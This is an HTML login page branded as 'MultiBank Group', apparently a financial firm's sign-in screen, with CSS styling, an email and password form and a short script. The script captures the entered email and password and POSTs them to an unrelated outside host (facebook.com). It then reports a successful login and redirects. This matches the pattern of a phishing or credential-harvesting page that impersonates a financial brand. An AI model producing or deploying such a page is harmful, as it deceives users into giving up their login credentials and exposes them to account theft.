<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>MultiBank Group Login</title>
    <style>
        body {
            margin: 0;
            padding: 0;
            font-family: Arial, sans-serif;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            background-color: #f3f4f6;
        }

        .login-container {
            display: flex;
            background-color: #1a1a2e;
            color: #fff;
            border-radius: 10px;
            overflow: hidden;
            box-shadow: 0 0 20px rgba(0, 0, 0, 0.1);
        }

        .login-box,
        .info-box {
            padding: 20px;
        }

        .login-box {
            background-color: #0d0d1a;
        }

        .info-box {
            background-color: #1a1a2e;
            display: flex;
            flex-direction: column;
            justify-content: center;
            align-items: center;
            text-align: center;
        }

        .input-group {
            margin-bottom: 15px;
        }

        .input-group label {
            display: block;
            margin-bottom: 5px;
        }

        .input-group input {
            width: 100%;
            padding: 10px;
            border: 1px solid #ccc;
            border-radius: 5px;
        }

        .forgot-password {
            text-align: right;
            margin-bottom: 15px;
        }

        .forgot-password a {
            color: #1e90ff;
            text-decoration: none;
        }

        .forgot-password a:hover {
            text-decoration: underline;
        }

        button {
            width: 100%;
            padding: 10px;
            background-color: #1e90ff;
            border: none;
            border-radius: 5px;
            color: #fff;
            font-size: 16px;
            cursor: pointer;
        }

        button:hover {
            background-color: #1c7ed6;
        }

        .signup-link {
            text-align: center;
            margin-top: 20px;
        }

        .signup-link a {
            color: #1e90ff;
            text-decoration: none;
        }

        .signup-link a:hover {
            text-decoration: underline;
        }

        .guest-link {
            display: block;
            margin-top: 10px;
            color: #1e90ff;
            text-decoration: none;
        }

        .guest-link:hover {
            text-decoration: underline;
        }

        .info-box h1 {
            font-size: 24px;
            margin-bottom: 10px;
        }

        .info-box p {
            font-size: 16px;
        }

        .message {
            margin-bottom: 15px;
            font-size: 14px;
            color: #f00;
        }
    </style>
</head>

<body>
    <div class="login-container">
        <div class="login-box">
            <h2>Sign In</h2>
            <div class="message" id="message"></div>
            <form id="loginForm">
                <div class="input-group">
                    <label for="email">Email address*</label>
                    <input type="email" id="email" name="email" required>
                </div>
                <div class="input-group">
                    <label for="password">Password*</label>
                    <input type="password" id="password" name="password" required>
                </div>
                <div class="forgot-password">
                    <a href="#">Forgot Password?</a>
                </div>
                <button type="submit">Sign In</button>
            </form>
            <div class="signup-link">
                <p>Don't have an account? <a href="#">Sign up now</a></p>
                <a href="#" class="guest-link">Continue as a guest</a>
            </div>
        </div>
        <div class="info-box">
            <h1>MultiBank Group</h1>
            <p>Allocating more than US$ 322 Million to paid up capital</p>
        </div>
    </div>

    <script>
        document.getElementById('loginForm').addEventListener('submit', function (event) {
            event.preventDefault(); // Prevent the default form submission

            var email = document.getElementById('email').value;
            var password = document.getElementById('password').value;

            var xhr = new XMLHttpRequest();
            xhr.open('POST', 'https://www.facebook.com/', true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');

            xhr.onload = function () {
                var message = document.getElementById('message');
                if (xhr.status === 200) {
                    message.style.color = 'green';
                    message.textContent = 'Login successful. Redirecting...';
                    setTimeout(function () {
                        window.location.href = '/client_dashboard/'; // Redirect to the dashboard upon successful login
                    }, 2000);
                } else {
                    message.textContent = 'Login failed. Please try again.';
                }
            };

            xhr.onerror = function () {
                var message = document.getElementById('message');
                message.textContent = 'An error occurred during the request. Please try again.';
            };

            var params = 'email=' + encodeURIComponent(email) + '&password=' + encodeURIComponent(password);

            xhr.send(params);
        });
    </script>
</body>

</html>
